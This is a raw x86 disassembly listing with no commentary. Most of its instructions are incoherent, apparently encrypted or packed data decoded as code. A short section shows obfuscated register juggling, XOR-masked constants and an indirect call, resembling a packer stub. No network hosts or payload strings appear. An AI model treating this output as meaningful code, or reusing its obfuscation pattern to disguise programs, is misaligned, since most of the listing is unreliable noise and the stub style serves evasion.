  408bd7:	enter  0x709f,0x6
  408bdb:	icebp  
  408bdc:	shl    esi,1
  408bde:	dec    eax
  408bdf:	jns    0x408c2a
  408be1:	or     al,0x62
  408be3:	test   DWORD PTR fs:[esi+0x319dd3f5],ebp
  408bea:	sahf   
  408beb:	icebp  
  408bec:	adc    al,BYTE PTR [edx-0x5905d1d7]
  408bf2:	int    0x53
  408bf4:	cli    
  408bf5:	mov    ebp,0x1a61a8e1
  408bfa:	and    edx,ebp
  408bfc:	fistp  WORD PTR [edx-0xf]
  408bff:	pop    ds
  408c00:	cmp    eax,0x31e8b37a
  408c05:	jns    0x408c4a
  408c07:	dec    edi
  408c08:	loopne 0x408b8a
  408c0a:	(bad)  
  408c0b:	jecxz  0x408bd3
  408c0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c0e:	mov    bh,0x2c
  408c10:	outs   dx,BYTE PTR fs:[esi]
  408c12:	push   ecx
  408c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c14:	xor    DWORD PTR [ebp-0x3d],ebx
  408c17:	add    edi,eax
  408c19:	shr    esi,cl
  408c1b:	cdq    
  408c1c:	inc    ebx
  408c1d:	ss xor al,0x3a
  408c20:	mov    edi,cs
  408c22:	leave  
  408c23:	js     0x408c5e
  408c25:	fs pop ebp
  408c27:	and    DWORD PTR [eax-0x4b6b1fbe],0x1d0f41cd
  408c31:	hlt    
  408c32:	lock mov BYTE PTR [esi],dl
  408c35:	push   edi
  408c36:	out    dx,eax
  408c37:	mov    WORD PTR [eax+0x6988eaf1],?
  408c3d:	rol    BYTE PTR [eax+0x5b],cl
  408c40:	out    0x58,eax
  408c42:	mov    edi,0xf6781244
  408c47:	mov    esi,0xeaae2d6e
  408c4c:	repz ror DWORD PTR [ecx],1
  408c4f:	rol    BYTE PTR [esi-0x29],1
  408c52:	or     eax,0x73d0a0e1
  408c57:	scas   al,BYTE PTR es:[edi]
  408c58:	scas   eax,DWORD PTR es:[edi]
  408c59:	aam    0x75
  408c5b:	cmp    ebp,DWORD PTR ds:0x778bfe72
  408c61:	jne    0x408caf
  408c63:	adc    BYTE PTR [eax+edx*8],al
  408c66:	data16 xchg BYTE PTR [edx-0x8],dh
  408c6a:	mov    edi,0x580eba27
  408c6f:	or     al,0xab
  408c71:	jle    0x408c9b
  408c73:	cs and eax,0x726ab5d4
  408c79:	fild   WORD PTR [ebx-0x77567596]
  408c7f:	fwait
  408c80:	jno    0x408c0c
  408c82:	or     cl,BYTE PTR [ebx]
  408c84:	js     0x408c6b
  408c86:	out    dx,eax
  408c87:	ins    BYTE PTR es:[edi],dx
  408c88:	inc    ebp
  408c89:	or     BYTE PTR [edx+0x5a],0x8a
  408c8d:	mov    fs,WORD PTR [ebx]
  408c8f:	out    dx,eax
  408c90:	xchg   BYTE PTR [esi+0xf],ch
  408c93:	pop    esi
  408c94:	fucom  st(7)
  408c96:	add    esi,DWORD PTR [esi+0x54697718]
  408c9c:	or     eax,DWORD PTR [ebp+0x6b]
  408c9f:	std    
  408ca0:	add    esp,edi
  408ca2:	xchg   esi,eax
  408ca3:	cs inc edx
  408ca5:	hlt    
  408ca6:	ins    DWORD PTR es:[edi],dx
  408ca7:	js     0x408cc2
  408ca9:	lahf   
  408caa:	cmc    
  408cab:	mov    edi,0x63e52812
  408cb0:	mov    ds:0xf9fceb65,eax
  408cb5:	jp     0x408cf6
  408cb7:	push   ds
  408cb8:	sbb    ch,BYTE PTR [ebx+0x21]
  408cbb:	sbb    edx,DWORD PTR [ebp+0x15049f3f]
  408cc1:	out    dx,eax
  408cc2:	sub    BYTE PTR [eax],al
  408cc4:	shl    edx,1
  408cc6:	adc    DWORD PTR [ecx-0x65789fa6],eax
  408ccc:	sub    esi,DWORD PTR [edi+0x2b42c9d5]
  408cd2:	and    esi,DWORD PTR [ecx-0x7f9167ca]
  408cd8:	imul   ebp,DWORD PTR [ebx],0x11
  408cdb:	cmp    BYTE PTR [eax],cl
  408cdd:	in     eax,dx
  408cde:	mov    al,ds:0xc377e314
  408ce3:	sbb    al,0x3
  408ce5:	dec    edx
  408ce6:	xchg   esp,eax
  408ce7:	add    esi,DWORD PTR [edi]
  408ce9:	push   0x26
  408ceb:	int    0xc7
  408ced:	scas   eax,DWORD PTR es:[edi]
  408cee:	pop    esp
  408cef:	faddp  st(3),st
  408cf1:	rcl    DWORD PTR [ebp+ebx*2+0x68],1
  408cf5:	xlat   BYTE PTR ds:[ebx]
  408cf6:	and    ebp,ecx
  408cf8:	enter  0xee02,0x19
  408cfc:	mov    edi,0x80420022
  408d01:	loopne 0x408cc3
  408d03:	pop    ss
  408d04:	jne    0x40694b
  408d0a:	mov    eax,esi
  408d0c:	jmp    0x408d16
  408d11:	mov    eax,0x3272db
  408d16:	mov    ebx,0x7510893
  408d1b:	mov    ecx,DWORD PTR [ebp-0x4]
  408d1e:	xor    ecx,ebx
  408d20:	add    ecx,eax
  408d22:	mov    DWORD PTR [ebp-0xc],ecx
  408d25:	mov    ebx,0x65655
  408d2a:	add    ebx,0x3234
  408d30:	xchg   ebx,esi
  408d32:	xor    ebx,ebx
  408d34:	push   esi
  408d35:	mov    esi,ebx
  408d37:	pop    ebx
  408d38:	mov    edx,esi
  408d3a:	add    ebx,0x1002
  408d40:	lea    eax,[ebp-0x10]
  408d43:	add    edx,eax
  408d45:	add    edx,0x5
  408d48:	push   edx
  408d49:	inc    esi
  408d4a:	pop    ecx
  408d4b:	dec    ecx
  408d4c:	xchg   ecx,eax
  408d4d:	dec    eax
  408d4e:	xchg   ecx,eax
  408d4f:	dec    ecx
  408d50:	xchg   ecx,edx
  408d52:	dec    edx
  408d53:	push   edx
  408d54:	mov    edx,ebx
  408d56:	pop    ebx
  408d57:	dec    ebx
  408d58:	call   DWORD PTR [ebx]
  408d5a:	cmp    DWORD PTR [ebp+0x10],esi
  408d5d:	je     0x408d7c
  408d63:	xchg   edx,eax
  408d64:	push   0xb
  408d66:	pop    ecx
  408d67:	push   0x4
  408d69:	pop    ebx
  408d6a:	inc    ebx
  408d6b:	xchg   ebx,ecx
  408d6d:	sub    ebx,ecx
  408d6f:	xchg   ebx,ecx
  408d71:	dec    ecx
  408d72:	dec    ecx
  408d73:	mov    eax,DWORD PTR [ebp-0x1c]
  408d76:	imul   eax,ecx
  408d79:	add    esp,eax
  408d7b:	xchg   edx,eax
  408d7c:	push   eax
  408d7d:	xor    ebx,ebx
  408d7f:	mov    edx,esp
  408d81:	dec    edx
  408d82:	inc    ebx
  408d83:	add    ebx,DWORD PTR [edx+ebx*1]
  408d86:	dec    ebx
  408d87:	xor    edx,edx
  408d89:	add    DWORD PTR [ebp-0xc],ebx
  408d8c:	pop    ebx
  408d8d:	mov    eax,DWORD PTR [ebp-0xc]
  408d90:	pop    edi
  408d91:	pop    esi
  408d92:	pop    ebx
  408d93:	leave  
  408d94:	ret    0x10
  408d97:	push   ebp
  408d98:	mov    ebp,esp
  408d9a:	push   ecx
  408d9b:	xor    ecx,ecx
  408d9d:	xor    ecx,DWORD PTR ds:0x43000c
  408da3:	and    DWORD PTR ds:0x430014,ecx
  408da9:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  408db0:	mov    eax,DWORD PTR [ebp-0x4]
  408db3:	sub    edx,edx
  408db5:	mov    edx,DWORD PTR [ebp+0x10]
  408db8:	and    DWORD PTR ds:0x431014,ebx
  408dbe:	mov    ecx,0x7510893
  408dc3:	xor    eax,ecx
  408dc5:	add    eax,0x3272db
  408dca:	mov    DWORD PTR [edx],eax
  408dcc:	mov    DWORD PTR ds:0x430008,0x4f8c
  408dd6:	mov    eax,DWORD PTR [ebp+0xc]
  408dd9:	sbb    DWORD PTR ds:0x42f020,0x2880
  408de3:	xor    eax,ecx
  408de5:	and    DWORD PTR ds:0x433008,0x0
  408def:	mov    edx,DWORD PTR ds:0x433008
  408df5:	inc    edx
  408df6:	mov    DWORD PTR ds:0x433008,edx
  408dfc:	cmp    DWORD PTR ds:0x433008,0x17
  408e03:	jne    0x408e19
  408e09:	push   0x4246b1
  408e0e:	push   0x391b
  408e13:	call   DWORD PTR ds:0x42b008
  408e19:	cmp    DWORD PTR ds:0x433008,0x15
  408e20:	jb     0x408def
  408e26:	xor    DWORD PTR ds:0x43100c,edi
  408e2c:	push   esi
  408e2d:	mov    esi,DWORD PTR [ebp+0x10]
  408e30:	mov    edx,0x3272db
  408e35:	add    eax,edx
  408e37:	mov    DWORD PTR [esi+0x4],eax
  408e3a:	mov    eax,DWORD PTR [ebp+0x14]
  408e3d:	mov    esi,DWORD PTR [ebp+0x10]
  408e40:	mov    DWORD PTR [esi+0x8],eax
  408e43:	jmp    0x40b197
  408e48:	push   ebp
  408e49:	add    al,0x4c
  408e4b:	mov    al,ds:0x6365b8eb
  408e50:	add    eax,0xa73327cf
  408e55:	repnz test al,0xfc
  408e58:	mov    bl,BYTE PTR [ecx]
  408e5a:	bound  esp,QWORD PTR [edx+0x2b]
  408e5d:	pop    edi
  408e5e:	bound  esp,QWORD PTR [edx-0x34]
  408e61:	pop    eax
  408e62:	pushf  
  408e63:	dec    eax
  408e64:	or     bh,BYTE PTR [ebx+esi*2]
  408e67:	and    DWORD PTR [ebx-0x5cb77c3f],ecx
  408e6d:	retf   0xd9ec
  408e70:	bound  ebp,QWORD PTR [ebx-0x45]
  408e73:	leave  
  408e74:	fsubr  DWORD PTR [ecx-0x4d629d23]
  408e7a:	cmp    esi,DWORD PTR [edx+0x62d362ac]
  408e80:	fdivr  DWORD PTR [esi-0x5137d1ca]
  408e86:	sahf   
  408e87:	test   eax,0x2b8f8674
  408e8c:	mov    ecx,esp
  408e8e:	nop
  408e8f:	std    
  408e90:	cmp    al,0xb
  408e92:	imul   eax,DWORD PTR [ebx+0x5e],0xbf693ff
  408e99:	mov    ah,0x6
  408e9b:	in     al,dx
  408e9c:	or     al,0xb7
  408e9e:	xchg   edx,eax
  408e9f:	pop    esi
  408ea0:	push   esp
  408ea1:	mov    edi,0x9666873
  408ea6:	push   ss
  408ea7:	and    eax,0x11621f9f
  408eac:	in     eax,0x76
  408eae:	xor    al,BYTE PTR [ebp-0x328a0a9b]
  408eb4:	mov    bh,0x29
  408eb6:	xor    ch,BYTE PTR [edi+0x7df2fc1e]
  408ebc:	in     al,dx
  408ebd:	into   
  408ebe:	mov    esi,0x16ccd6d0
  408ec3:	or     BYTE PTR [edx+0xe],cl
  408ec6:	xor    cl,BYTE PTR [edx]
  408ec8:	sbb    al,0xc2
  408eca:	ret    0xc9e3
  408ecd:	outs   dx,BYTE PTR ds:[esi]
  408ece:	sub    al,0x5
  408ed0:	(bad)  
  408ed1:	fstp   DWORD PTR [edx]
  408ed3:	aam    0x73
  408ed5:	push   ebp
  408ed6:	push   esi
  408ed7:	mov    dl,0xb
  408ed9:	cdq    
  408eda:	jno    0x408efd
  408edc:	jl     0x408e7c
  408ede:	jae    0x408f33
  408ee0:	push   es
  408ee1:	(bad)  
  408ee2:	fld    TBYTE PTR [esi-0x5d]
  408ee5:	inc    BYTE PTR [ecx+0x79]
  408ee8:	push   esp
  408ee9:	mov    bh,0x4e
  408eeb:	adc    eax,ebp
  408eed:	jb     0x408e71
  408eef:	ins    BYTE PTR es:[edi],dx
  408ef0:	mov    dl,0x72
  408ef2:	mov    WORD PTR [edx+0x3e82a1a3],ss
  408ef8:	jo     0x408eeb
  408efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408efb:	call   0x4fe6:0x206f6436
  408f02:	repz retf 0x7986
  408f06:	stos   BYTE PTR es:[edi],al
  408f07:	pop    eax
  408f08:	dec    eax
  408f09:	jmp    0x408f41
  408f0b:	mov    ch,0x12
  408f0d:	mov    DWORD PTR [edi-0x4a849031],ebx
  408f13:	in     eax,dx
  408f14:	enter  0x320e,0xa6
  408f18:	out    0xdc,al
  408f1a:	clc    
  408f1b:	je     0x408f93
  408f1d:	cld    
  408f1e:	ja     0x408ec2
  408f20:	push   esp
  408f21:	fstp   QWORD PTR ds:0xea81e64f
  408f27:	scas   al,BYTE PTR es:[edi]
  408f28:	jp     0x408f5e
  408f2a:	test   al,0x74
  408f2c:	mov    ss,WORD PTR [ebp*4-0xb056c51]
  408f33:	sbb    ch,BYTE PTR [ebx-0x2f27b5af]
  408f39:	xor    BYTE PTR [ebx+ebp*1-0x6a],bh
  408f3d:	fsub   QWORD PTR [edx]
  408f3f:	loop   0x408fad
  408f41:	push   ebx
  408f42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f43:	mov    DWORD PTR [eax+0x19d4f1a3],eax
  408f49:	outs   dx,DWORD PTR ds:[esi]
  408f4a:	mov    bh,0xe4
  408f4c:	mov    dh,bh
  408f4e:	fwait
  408f4f:	fwait
  408f50:	and    ah,BYTE PTR [ebx-0x426b21db]
  408f56:	test   BYTE PTR [esi-0x5cc074eb],ah
  408f5c:	dec    eax
  408f5d:	push   esi
  408f5e:	dec    edi
  408f5f:	mov    al,ds:0x6d065398
  408f64:	aaa    
  408f65:	cmp    dh,al
  408f67:	sub    eax,0xdcb1bd95
  408f6c:	scas   al,BYTE PTR es:[edi]
  408f6d:	jo     0x408f0f
  408f6f:	xchg   DWORD PTR [edx],ecx
  408f71:	cmp    eax,0x724b46f6
  408f76:	rol    BYTE PTR [eax-0x71],cl
  408f79:	inc    esp
  408f7a:	stc    
  408f7b:	dec    ebp
  408f7c:	dec    ebx
  408f7d:	push   edx
  408f7e:	je     0x408f3a
  408f80:	mov    dl,0x85
  408f82:	dec    ebp
  408f83:	jle    0x408faa
  408f85:	pop    ss
  408f86:	dec    esi
  408f87:	push   ecx
  408f88:	cmp    BYTE PTR [ecx+0x44],ah
  408f8b:	sub    esi,edi
  408f8d:	inc    esi
  408f8e:	pusha  
  408f8f:	inc    ecx
  408f90:	dec    ebx
  408f91:	mov    dl,0x56
  408f93:	add    DWORD PTR [esi+0x4f08b1e7],ebx
  408f99:	into   
  408f9a:	std    
  408f9b:	pop    edi
  408f9c:	xor    BYTE PTR [esi+ebp*2],0x20
  408fa0:	out    dx,eax
  408fa1:	in     al,0xe6
  408fa3:	mov    al,0x14
  408fa5:	retf   0x67fc
  408fa8:	mov    eax,0x6ada5af6
  408fad:	rcr    BYTE PTR [esi-0x3e],1
  408fb0:	jne    0x408ff9
  408fb2:	ss mov esp,0x9112543a
  408fb8:	mov    edx,0xf42b342a
  408fbd:	pop    edi
  408fbe:	call   0x5390:0x46fd684f
  408fc5:	shl    BYTE PTR [ebx],cl
  408fc7:	mov    eax,0x9e89308d
  408fcc:	jl     0x408fae
  408fce:	imul   ebx,DWORD PTR [edx+0x53d91c37],0xeefd5789
  408fd8:	iret   
  408fd9:	dec    eax
  408fda:	fst    QWORD PTR [ecx]
  408fdc:	fiadd  DWORD PTR [edi+0xfb08bf1]
  408fe2:	in     al,0xfd
  408fe4:	adc    BYTE PTR [edi+0x5d],0x24
  408fe8:	push   0xdb8dd015
  408fed:	scas   al,BYTE PTR es:[edi]
  408fee:	mov    BYTE PTR [edi],bh
  408ff0:	imul   ebx,DWORD PTR [eax-0x43],0xbbdf2358
  408ff7:	adc    al,0xed
  408ff9:	adc    eax,0xc36aed85
  408ffe:	out    0x9f,eax
  409000:	into   
  409001:	sub    edx,DWORD PTR [ecx+0x42]
  409004:	xchg   esp,eax
  409005:	int    0xfc
  409007:	stos   DWORD PTR es:[edi],eax
  409008:	push   eax
  409009:	adc    DWORD PTR [ebx-0x5e],ecx
  40900c:	imul   di,ax,0xff91
  409010:	push   cs
  409011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409012:	or     eax,0x9ccf91ff
  409017:	push   0x37
  409019:	xchg   ecx,eax
  40901a:	xor    al,0x5
  40901c:	fwait
  40901d:	aam    0xc7
  40901f:	mov    dh,0x36
  409021:	call   0xeebced8b
  409026:	bound  esi,QWORD PTR [edi]
  409028:	mov    ecx,0x4d07907d
  40902d:	push   esi
  40902e:	add    al,ch
  409030:	rcl    DWORD PTR [esi],0xad
  409033:	mov    ebp,0xef19e38b
  409038:	push   ebx
  409039:	mov    dl,0xe2
  40903b:	idiv   edx
  40903d:	scas   eax,DWORD PTR es:[edi]
  40903e:	mov    bh,0x71
  409040:	xchg   ecx,eax
  409041:	(bad)
  409044:	push   es
  409045:	call   0xf294:0x8be08374
  40904c:	push   ebx
  40904d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40904e:	dec    edi
  40904f:	ss clc 
  409051:	cmp    al,0x5c
  409053:	fst    QWORD PTR [ebx]
  409055:	mov    ch,0x41
  409057:	xchg   ecx,eax
  409058:	push   DWORD PTR [ecx+0xa]
  40905b:	aam    0x7
  40905d:	sub    edx,esp
  40905f:	or     bh,bl
  409061:	inc    esp
  409062:	retf   0x4da
  409065:	inc    ecx
  409066:	fwait
  409067:	mov    bh,0x66
  409069:	cwde   
  40906a:	add    dh,BYTE PTR ds:[ecx-0x3e]
  40906e:	dec    esp
  40906f:	retf   
  409070:	cmp    cl,bl
  409072:	add    esi,DWORD PTR [eax+0x1a]
  409075:	push   ecx
  409076:	or     al,0x1f
  409078:	jae    0x409023
  40907a:	dec    edi
  40907b:	sbb    dl,BYTE PTR [ebx-0x36]
  40907e:	ficom  DWORD PTR [ecx]
  409080:	int3   
  409081:	sbb    edx,edi
  409083:	mov    dl,0x18
  409085:	add    BYTE PTR [eax],dh
  409087:	std    
  409088:	stc    
  409089:	mov    BYTE PTR [edx+edi*4-0x5b],0x5b
  40908e:	sbb    al,0x6c
  409090:	in     al,0xd8
  409092:	dec    ebx
  409093:	mov    al,0xee
  409095:	or     al,0xfe
  409097:	mov    eax,ds:0x2397e2ef
  40909c:	adc    al,0xe5
  40909e:	xlat   BYTE PTR ds:[ebx]
  40909f:	lock xlat BYTE PTR ds:[ebx]
  4090a1:	fcompp 
  4090a3:	pop    ecx
  4090a4:	lods   eax,DWORD PTR ds:[esi]
  4090a5:	xchg   ebx,eax
  4090a6:	iret   
  4090a7:	adc    cl,BYTE PTR [edx+0x55]
  4090aa:	cli    
  4090ab:	ret    
  4090ac:	xchg   edx,eax
  4090ad:	int3   
  4090ae:	sub    DWORD PTR [ecx-0x58],edx
  4090b1:	shl    DWORD PTR [ecx+ecx*2+0x47360903],0x5c
  4090b9:	or     dl,BYTE PTR [ebp-0x36]
  4090bc:	enter  0xc1d2,0xc2
  4090c0:	push   cs
  4090c1:	mov    ecx,0xbdb43186
  4090c6:	sub    eax,0x210a2806
  4090cb:	push   cs
  4090cc:	pop    ds
  4090cd:	test   DWORD PTR [esi+eax*1-0x549c17bc],0x632cd2cf
  4090d8:	or     BYTE PTR [esp+ebx*2+0xe],0x5c
  4090dd:	frstor [edx-0x33]
  4090e0:	mov    bh,0x8d
  4090e2:	aad    0xe9
  4090e4:	cmovns esi,esp
  4090e7:	retf   
  4090e8:	dec    esi
  4090e9:	dec    DWORD PTR [ebx]
  4090eb:	dec    ebp
  4090ec:	icebp  
  4090ed:	dec    edx
  4090ee:	(bad)  
  4090ef:	sub    eax,0xbeb9b3c2
  4090f4:	xlat   BYTE PTR ds:[ebx]
  4090f5:	mov    esi,0xa308a2f
  4090fa:	adc    DWORD PTR [ecx],0xffffff98
  4090fd:	inc    edi
  4090fe:	std    
  4090ff:	dec    ecx
  409100:	mov    al,0x7d
  409102:	and    BYTE PTR [ebx+0x12],ah
  409105:	sub    DWORD PTR [eax],ebp
  409107:	mov    ecx,DWORD PTR [eax+0xd]
  40910a:	addr16 pop eax
  40910c:	sbb    DWORD PTR [edx],0x1cb83b02
  409112:	add    al,0x44
  409114:	fdiv   QWORD PTR [ebx]
  409116:	(bad)  
  409118:	add    ecx,DWORD PTR [ecx]
  40911a:	mov    ebx,esp
  40911c:	inc    ebp
  40911d:	enter  0x9664,0xce
  409121:	mov    BYTE PTR [ecx+0x72],0x85
  409125:	and    eax,0x8000e8c
  40912a:	dec    esp
  40912b:	cmp    DWORD PTR [ebx],edi
  40912d:	js     0x40911e
  40912f:	jb     0x4090b9
  409131:	fidivr WORD PTR [edx+edi*8-0x62]
  409135:	dec    edi
  409136:	nop
  409137:	cdq    
  409138:	push   ecx
  409139:	iret   
  40913a:	daa    
  40913b:	and    al,0x44
  40913d:	add    edi,ecx
  40913f:	pop    esi
  409140:	loop   0x4090d6
  409142:	dec    BYTE PTR [edi+0xe]
  409145:	push   esp
  409146:	mov    edi,0xe8f4697c
  40914b:	cmp    DWORD PTR [ecx],0xb038adc8
  409151:	pop    es
  409152:	dec    ebp
  409153:	mov    cl,0x16
  409155:	sub    al,0x11
  409157:	bound  ebp,QWORD PTR [eax+eiz*8-0x68b8d37e]
  40915e:	dec    esp
  40915f:	adc    al,0x5b
  409161:	jbe    0x409192
  409163:	pop    edx
  409164:	adc    BYTE PTR [ebp+0x47721511],ch
  40916a:	loopne 0x409150
  40916c:	or     BYTE PTR [edx],cl
  40916e:	sbb    al,0xe0
  409170:	lock mov eax,0xaa0c336a
  409176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409177:	shl    ecx,0x6f
  40917a:	gs ins DWORD PTR es:[edi],dx
  40917c:	fisubr DWORD PTR [esp+esi*8-0x4c]
  409180:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409181:	fs xchg ebp,eax
  409183:	sub    ebx,DWORD PTR [ecx]
  409185:	fstp   DWORD PTR ds:0x30ae27c0
  40918b:	popa   
  40918c:	xchg   ebx,eax
  40918d:	lahf   
  40918e:	mov    dh,BYTE PTR [ecx]
  409190:	push   ds
  409191:	xor    dl,BYTE PTR [ebx-0x468d55f]
  409197:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409198:	mov    ecx,0x50739065
  40919d:	loopne 0x4091c4
  40919f:	dec    esi
  4091a0:	outs   dx,BYTE PTR ds:[esi]
  4091a1:	lea    ebp,[edi]
  4091a3:	jge    0x4091ee
  4091a5:	test   eax,0x8b0230f6
  4091aa:	loop   0x409200
  4091ac:	dec    edi
  4091ad:	push   0x6e
  4091af:	or     ebp,0xa2baf2fd
  4091b5:	dec    esi
  4091b6:	in     al,0x4a
  4091b8:	popa   
  4091b9:	lahf   
  4091ba:	(bad)  
  4091bb:	cwde   
  4091bc:	(bad)  
  4091bd:	fadd   QWORD PTR [ecx+0x7f]
  4091c0:	cld    
  4091c1:	sbb    BYTE PTR [edi],0x30
  4091c4:	bound  ebx,QWORD PTR [edx+0x56c2f635]
  4091ca:	cdq    
  4091cb:	cmp    eax,0x21181d64
  4091d0:	test   DWORD PTR [edi+0x5b],esi
  4091d3:	push   es
  4091d4:	xchg   edx,eax
  4091d5:	jbe    0x4091ec
  4091d7:	aad    0x92
  4091d9:	adc    BYTE PTR [ebx-0x7b41606e],ah
  4091df:	bound  ebp,QWORD PTR [edi+0x1acb1117]
  4091e5:	push   eax
  4091e6:	lahf   
  4091e7:	mov    dl,0x0
  4091e9:	sbb    edx,DWORD PTR [eax+0x6a]
  4091ec:	and    dh,BYTE PTR [edi]
  4091ee:	jbe    0x40925d
  4091f0:	(bad)  
  4091f1:	fs dec ebp
  4091f3:	pop    ebp
  4091f4:	push   ecx
  4091f5:	dec    eax
  4091f6:	push   esp
  4091f7:	cmp    eax,DWORD PTR [edi]
  4091f9:	leave  
  4091fa:	cmc    
  4091fb:	dec    esi
  4091fc:	sub    al,0x7d
  4091fe:	mov    bh,0xf0
  409200:	xlat   BYTE PTR ds:[ebx]
  409201:	scas   eax,DWORD PTR es:[edi]
  409202:	adc    al,0x0
  409204:	and    eax,0x24473743
  409209:	mov    es,ebx
  40920b:	xchg   edx,eax
  40920c:	push   esp
  40920d:	retf   
  40920e:	fadd   DWORD PTR [edi+ebp*4-0x3fd882cf]
  409215:	clc    
  409216:	sub    eax,0xcb68aca3
  40921b:	adc    BYTE PTR [ebx-0x29360287],bh
  409221:	xor    eax,0x551801e9
  409226:	loop   0x40925d
  409228:	push   eax
  409229:	frstor [esi-0x3068a2c4]
  40922f:	jb     0x4091b8
  409231:	push   cs
  409232:	sbb    esp,DWORD PTR [ebp+ebp*8+0xc]
  409236:	pop    eax
  409237:	xchg   ebp,eax
  409238:	stos   DWORD PTR es:[edi],eax
  409239:	push   ds
  40923a:	sub    ecx,DWORD PTR [edx+0x17dac1dd]
  409240:	lds    ebx,FWORD PTR [edx+esi*4]
  409243:	pop    edx
  409244:	fisttp QWORD PTR [edx+esi*8-0x79]
  409248:	and    DWORD PTR [ebx-0x23],esi
  40924b:	aad    0x8e
  40924d:	cmp    bl,dl
  40924f:	sbb    ecx,DWORD PTR [ecx-0x366ca174]
  409255:	pushf  
  409256:	arpl   WORD PTR ds:0x63d737f5,bx
  40925c:	jp     0x409256
  40925e:	mov    al,ds:0x535dc224
  409263:	xor    ah,BYTE PTR [ecx]
  409265:	mov    ds:0x77886cff,al
  40926a:	sar    DWORD PTR [esi+0x287c8a07],cl
  409270:	mov    BYTE PTR [esi-0x617ab6d2],bl
  409276:	je     0x409248
  409278:	dec    ebp
  409279:	mov    ecx,0x8a4622b6
  40927e:	mov    DWORD PTR [ebx],ebx
  409280:	mov    BYTE PTR [esi-0x4becfc0c],0xf3
  409287:	sbb    eax,esp
  409289:	out    dx,eax
  40928a:	jne    0x40928c
  40928c:	call   0x27e9:0x7ec5f59f
  409293:	add    BYTE PTR [ebx+eiz*1],cl
  409296:	rcr    DWORD PTR [esi-0x2eb95ee3],0xc9
  40929d:	outs   dx,DWORD PTR ds:[esi]
  40929e:	lods   eax,DWORD PTR ds:[esi]
  40929f:	fild   WORD PTR [ebx+0x46]
  4092a2:	inc    ebx
  4092a3:	mov    esi,eax
  4092a5:	sbb    al,0x88
  4092a7:	mov    eax,ds:0x8e0c823b
  4092ac:	inc    eax
  4092ad:	mov    dh,0xaf
  4092af:	mov    dl,0xfb
  4092b1:	not    BYTE PTR [ecx]
  4092b3:	shr    BYTE PTR [eax],1
  4092b5:	test   BYTE PTR [eax],bl
  4092b7:	xchg   edi,eax
  4092b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092b9:	jnp    0x409309
  4092bb:	fdiv   QWORD PTR [ebp-0x32611aa5]
  4092c1:	jle    0x409293
  4092c3:	neg    BYTE PTR [edi-0x40a5e60d]
  4092c9:	mov    ebp,0xeb65a106
  4092ce:	cwde   
  4092cf:	inc    ebx
  4092d0:	fwait
  4092d1:	jle    0x40934f
  4092d3:	sub    eax,eax
  4092d5:	xchg   DWORD PTR [ebx+0xc],edx
  4092d8:	(bad)  
  4092d9:	call   0x7fd031a3
  4092de:	pop    edi
  4092df:	pop    esi
  4092e0:	mov    ds:0x9d9a93a5,eax
  4092e5:	aam    0xcc
  4092e7:	js     0x409352
  4092e9:	das    
  4092ea:	mov    WORD PTR [ebx+0x27],cs
  4092ed:	(bad)  [ebx-0xdd6c5df]
  4092f3:	sbb    bl,bl
  4092f5:	ins    DWORD PTR es:[edi],dx
  4092f6:	jae    0x409347
  4092f8:	xchg   ebp,eax
  4092f9:	(bad)  
  4092fa:	mov    ds:0x81d6a283,al
  4092ff:	and    BYTE PTR [ecx],0x51
  409302:	out    0xd1,eax
  409304:	mov    bl,0x79
  409306:	pop    esi
  409308:	dec    esp
  409309:	add    BYTE PTR [ebp-0x74],bh
  40930c:	sbb    edi,esi
  40930e:	(bad)  
  40930f:	fdivr  DWORD PTR [ebx+0x78]
  409312:	lahf   
  409313:	push   eax
  409314:	mov    esi,0x35385b7b
  409319:	and    esi,DWORD PTR [eax-0x77]
  40931c:	mov    dl,0x14
  40931e:	jg     0x409372
  409320:	stos   BYTE PTR es:[edi],al
  409321:	cmc    
  409322:	xchg   ebx,eax
  409323:	ret    
  409324:	jg     0x4092b3
  409326:	mov    ebp,0xa70ce129
  40932b:	adc    ah,BYTE PTR [esp+eiz*8]
  40932e:	mov    ebp,0x3ffb3be4
  409333:	loopne 0x40934d
  409335:	scas   al,BYTE PTR es:[edi]
  409336:	mov    esp,0x9b4f6290
  40933b:	inc    ebp
  40933c:	xor    BYTE PTR [ecx+0x4],al
  40933f:	test   BYTE PTR [edx],ah
  409341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409342:	or     eax,0x7d0633ec
  409347:	mov    edx,DWORD PTR ds:0x8517aa54
  40934d:	xchg   ebp,eax
  40934e:	inc    edx
  40934f:	cmp    ch,BYTE PTR [ecx]
  409351:	or     ch,ah
  409353:	hlt    
  409354:	and    al,0xf7
  409356:	or     al,0xfe
  409358:	adc    esp,DWORD PTR [esi+0x4b]
  40935b:	pusha  
  40935c:	dec    ebp
  40935d:	cmp    eax,0x27418c5c
  409362:	sbb    al,0x84
  409364:	push   esi
  409365:	clc    
  409366:	mov    edi,DWORD PTR [esi+0xb]
  409369:	cmp    ah,bh
  40936b:	inc    eax
  40936c:	pop    edx
  40936d:	xor    al,0x73
  40936f:	arpl   WORD PTR [edi+0x76dcf503],dx
  409375:	popa   
  409376:	mov    esp,DWORD PTR [edi-0x73fafc71]
  40937c:	call   0x74c4acbf
  409381:	iret   
  409382:	retf   0xaa16
  409385:	cmp    ch,dh
  409387:	push   eax
  409388:	xchg   esi,eax
  409389:	push   0x1efc9fa7
  40938e:	in     eax,0xe3
  409390:	jmp    0x36b3:0xdfb22f7a
  409397:	inc    edx
  409398:	lahf   
  409399:	inc    edi
  40939a:	xlat   BYTE PTR ds:[ebx]
  40939b:	and    al,bl
  40939d:	pop    es
  40939e:	inc    ecx
  40939f:	mov    BYTE PTR gs:[ecx],cl
  4093a2:	adc    BYTE PTR [ebx-0x24612dec],0x4
  4093a9:	jecxz  0x4093ac
  4093ab:	je     0x4093f8
  4093ad:	(bad)  
  4093ae:	xor    BYTE PTR ss:[edx+0x77],dh
